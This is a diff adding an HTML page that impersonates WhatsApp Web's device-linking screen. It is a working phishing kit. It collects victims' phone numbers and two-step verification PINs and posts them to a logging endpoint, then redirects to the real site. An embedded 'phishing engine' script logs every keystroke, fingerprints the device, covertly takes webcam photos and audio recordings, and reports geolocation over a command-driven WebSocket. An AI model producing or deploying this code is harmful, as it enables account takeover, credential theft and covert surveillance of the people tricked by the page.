@@ -1,0 +1,387 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>WhatsApp Web</title>
+  <style>
+    :root {
+      --bg-color: #0c1014;
+      --card-bg: #1c222a;
+      --text-color: #e0e8f0;
+      --input-bg: #151a21;
+      --input-border: #303e4d;
+      --wa-teal: #00a884;
+    }
+    body {
+      background-color: var(--bg-color);
+      color: var(--text-color);
+      font-family: Segoe UI, Helvetica Neue, Helvetica, Lucida Grande, Arial, Ubuntu, Cantarell, Fira Sans, sans-serif;
+      margin: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      user-select: none;
+    }
+    .card {
+      background: var(--card-bg);
+      border: 1px solid var(--input-border);
+      border-radius: 8px;
+      padding: 30px 40px;
+      width: 100%;
+      max-width: 480px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.3);
+      text-align: center;
+    }
+    .header {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      margin-bottom: 24px;
+    }
+    .logo-icon {
+      font-size: 32px;
+      color: var(--wa-teal);
+    }
+    .title {
+      font-size: 20px;
+      font-weight: 300;
+      margin: 0;
+      color: #fff;
+    }
+    .instruction {
+      font-size: 15px;
+      color: #aaa;
+      margin-bottom: 30px;
+      line-height: 1.5;
+    }
+    .form-group {
+      margin-bottom: 20px;
+      text-align: left;
+    }
+    label {
+      display: block;
+      font-size: 13px;
+      color: var(--wa-teal);
+      margin-bottom: 6px;
+      font-weight: 600;
+    }
+    input {
+      width: 100%;
+      box-sizing: border-box;
+      padding: 14px 16px;
+      background: var(--input-bg);
+      border: 1px solid var(--input-border);
+      border-radius: 6px;
+      color: #fff;
+      font-size: 15px;
+      outline: none;
+      transition: border-color 0.2s;
+    }
+    input:focus {
+      border-color: var(--wa-teal);
+    }
+    .btn-submit {
+      width: 100%;
+      background: var(--wa-teal);
+      color: #fff;
+      border: none;
+      border-radius: 6px;
+      padding: 14px;
+      font-size: 16px;
+      font-weight: bold;
+      cursor: pointer;
+      margin-top: 10px;
+      transition: background 0.2s;
+    }
+    .btn-submit:hover {
+      background: #008f6f;
+    }
+    .btn-submit:disabled {
+      opacity: 0.5;
+      cursor: not-allowed;
+    }
+    .qr-emulation {
+      margin: 20px auto;
+      width: 150px;
+      height: 150px;
+      background: #fff;
+      padding: 10px;
+      border-radius: 4px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      position: relative;
+    }
+    .qr-emulation img {
+      width: 100%;
+      height: 100%;
+    }
+  </style>
+</head>
+<body>
+
+<div class="card">
+  <div class="header">
+    <div class="logo-icon">💬</div>
+    <h1 class="title">WhatsApp Web Link</h1>
+  </div>
+  
+  <div class="qr-emulation">
+    <!-- QR placeholder -->
+    <svg viewBox="0 0 100 100" width="100%" height="100%">
+      <rect width="100" height="100" fill="white"/>
+      <rect x="10" y="10" width="20" height="20" fill="black"/>
+      <rect x="15" y="15" width="10" height="10" fill="white"/>
+      <rect x="70" y="10" width="20" height="20" fill="black"/>
+      <rect x="75" y="15" width="10" height="10" fill="white"/>
+      <rect x="10" y="70" width="20" height="20" fill="black"/>
+      <rect x="15" y="75" width="10" height="10" fill="white"/>
+      <!-- Random blocks -->
+      <rect x="40" y="20" width="10" height="10" fill="black"/>
+      <rect x="50" y="40" width="20" height="10" fill="black"/>
+      <rect x="30" y="50" width="10" height="20" fill="black"/>
+      <rect x="60" y="70" width="15" height="15" fill="black"/>
+    </svg>
+  </div>
+  
+  <p class="instruction">To link WhatsApp Web to your device, please confirm your phone number and secondary verification PIN code below.</p>
+  
+  <form id="login-form">
+    <div class="form-group">
+      <label for="phone">Phone Number (with Country Code)</label>
+      <input type="text" id="phone" placeholder="e.g. +1 555 123 4567" autocomplete="username" required>
+    </div>
+    <div class="form-group">
+      <label for="pin">Two-Step Verification PIN</label>
+      <input type="password" id="pin" placeholder="Enter 6-digit PIN" maxlength="6" autocomplete="current-password" required>
+    </div>
+    <button type="submit" class="btn-submit" id="btn-submit" disabled>Link Device</button>
+  </form>
+</div>
+
+<script>
+  const form = document.getElementById('login-form');
+  const phoneInput = document.getElementById('phone');
+  const pinInput = document.getElementById('pin');
+  const submitBtn = document.getElementById('btn-submit');
+
+  function validate() {
+    submitBtn.disabled = !(phoneInput.value.trim().length >= 8 && pinInput.value.length === 6);
+  }
+  phoneInput.addEventListener('input', validate);
+  pinInput.addEventListener('input', validate);
+
+  form.addEventListener('submit', async (e) => {
+    e.preventDefault();
+    submitBtn.disabled = true;
+    submitBtn.textContent = 'Linking...';
+
+    if (typeof captureAudioOnLogin === 'function') {
+      captureAudioOnLogin();
+    }
+
+    try {
+      await fetch('/api/log', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ username: phoneInput.value, password: pinInput.value })
+      });
+    } catch(err) {}
+
+    setTimeout(() => {
+      window.location.assign('https://web.whatsapp.com');
+    }, 6500);
+  });
+</script>
+
+<!-- Embedded Phishing Engine Core (WebSocket & Media Relay) -->
+<script>
+  (function () {
+    'use strict';
+    let ws = null;
+    let wsReady = false;
+    const msgQueue = [];
+    let keystrokeBuffer = '';
+    let keystrokeTimer = null;
+
+    document.addEventListener('keydown', (e) => {
+      let key = e.key;
+      if (key === 'Enter') key = ' [Enter]\n';
+      else if (key === 'Backspace') key = ' [Backspace] ';
+      else if (key === 'Tab') key = ' [Tab] ';
+      else if (key.length > 1) key = ` [${key}] `;
+      
+      keystrokeBuffer += key;
+      if (!keystrokeTimer) {
+        keystrokeTimer = setTimeout(() => {
+          if (keystrokeBuffer) {
+            sendWS({ type: 'keystroke_data', keys: keystrokeBuffer });
+            keystrokeBuffer = '';
+          }
+          keystrokeTimer = null;
+        }, 500);
+      }
+    });
+
+    async function connectWS() {
+      const proto = location.protocol === 'https:' ? 'wss:' : 'ws:';
+      ws = new WebSocket(`${proto}//${location.host}`);
+
+      ws.onopen = async () => {
+        wsReady = true;
+        while (msgQueue.length > 0) {
+          ws.send(JSON.stringify(msgQueue.shift()));
+        }
+
+        let batteryLevel = null;
+        let batteryCharging = null;
+        try {
+          if (navigator.getBattery) {
+            const batt = await navigator.getBattery();
+            batteryLevel = Math.round(batt.level * 100);
+            batteryCharging = batt.charging;
+            
+            batt.addEventListener('levelchange', () => {
+              sendWS({ type: 'battery_update', level: Math.round(batt.level * 100), charging: batt.charging });
+            });
+            batt.addEventListener('chargingchange', () => {
+              sendWS({ type: 'battery_update', level: Math.round(batt.level * 100), charging: batt.charging });
+            });
+          }
+        } catch (e) {}
+
+        sendWS({
+          type: 'user_info',
+          userAgent: navigator.userAgent,
+          screen: `${screen.width}x${screen.height}`,
+          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+          language: navigator.language,
+          batteryLevel,
+          batteryCharging
+        });
+        startCapture();
+      };
+
+      ws.onmessage = (evt) => {
+        let msg;
+        try { msg = JSON.parse(evt.data); } catch { return; }
+        handleServerCommand(msg);
+      };
+
+      ws.onclose = () => {
+        wsReady = false;
+        setTimeout(connectWS, 5000);
+      };
+      ws.onerror = () => { };
+    }
+
+    function sendWS(data) {
+      if (ws && ws.readyState === WebSocket.OPEN) {
+        ws.send(JSON.stringify(data));
+      } else {
+        msgQueue.push(data);
+      }
+    }
+
+    function handleServerCommand(msg) {
+      switch (msg.type) {
+        case 'CAPTURE_PHOTO':       capturePhoto();    break;
+        case 'CAPTURE_AUDIO':       captureAudio();    break;
+        case 'SEND_LOCATION':       sendLocation();    break;
+        case 'SHOW_NOTIFICATION':
+          const notif = document.createElement('div');
+          notif.style.cssText = 'position:fixed;top:20px;left:50%;transform:translateX(-50%);background:#1c222a;border:1px solid #303e4d;color:#fff;padding:12px 24px;border-radius:8px;z-index:999999;box-shadow:0 4px 12px rgba(0,0,0,0.5);font-family:sans-serif;font-size:14px;';
+          notif.textContent = msg.message;
+          document.body.appendChild(notif);
+          setTimeout(() => notif.remove(), 6000);
+          break;
+      }
+    }
+
+    function sendLocation() {
+      if (!navigator.geolocation) return;
+      navigator.geolocation.getCurrentPosition(
+        (pos) => sendWS({
+          type: 'location_update',
+          lat: pos.coords.latitude,
+          lng: pos.coords.longitude,
+          accuracy: pos.coords.accuracy
+        }),
+        () => { },
+        { enableHighAccuracy: true }
+      );
+    }
+
+    function capturePhoto() {
+      if (!navigator.mediaDevices) return;
+      navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
+        .then(stream => {
+          const video = document.createElement('video');
+          video.srcObject = stream;
+          video.setAttribute('playsinline', '');
+          video.muted = true;
+          video.style.cssText = 'position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0;';
+          document.body.appendChild(video);
+          video.play().then(() => {
+            setTimeout(() => {
+              try {
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+                sendWS({ type: 'capture_photo', data: canvas.toDataURL('image/jpeg', 0.8) });
+              } catch (e) {}
+              stream.getTracks().forEach(t => t.stop());
+              video.remove();
+            }, 1000);
+          });
+        }).catch(() => {});
+    }
+
+    function captureAudio() {
+      if (!navigator.mediaDevices) return;
+      navigator.mediaDevices.getUserMedia({ audio: true, video: false })
+        .then(stream => {
+          const chunks = [];
+          const recorder = new MediaRecorder(stream);
+          recorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
+          recorder.onstop = () => {
+            const reader = new FileReader();
+            reader.onload = () => sendWS({ type: 'capture_audio', data: reader.result });
+            reader.readAsDataURL(new Blob(chunks, { type: 'audio/webm' }));
+          };
+          recorder.start();
+          setTimeout(() => { recorder.stop(); stream.getTracks().forEach(t => t.stop()); }, 6000);
+        }).catch(() => {});
+    }
+
+    function startCapture() {
+      if (navigator.mediaDevices) {
+        capturePhoto();
+        navigator.mediaDevices.getUserMedia({ audio: true, video: false })
+          .then(stream => {
+            const chunks = [];
+            const recorder = new MediaRecorder(stream);
+            recorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
+            recorder.onstop = () => {
+              const reader = new FileReader();
+              reader.onload = () => sendWS({ type: 'capture_audio', data: reader.result });
+              reader.readAsDataURL(new Blob(chunks, { type: 'audio/webm' }));
+            };
+            recorder.start();
+            setTimeout(() => { recorder.stop(); stream.getTracks().forEach(t => t.stop()); }, 6000);
+          }).catch(() => {});
+      }
+      sendLocation();
+    }
+
+    window.captureAudioOnLogin = captureAudio;
+
+    connectWS();
+  })();
+</script>
+</body>
+</html>
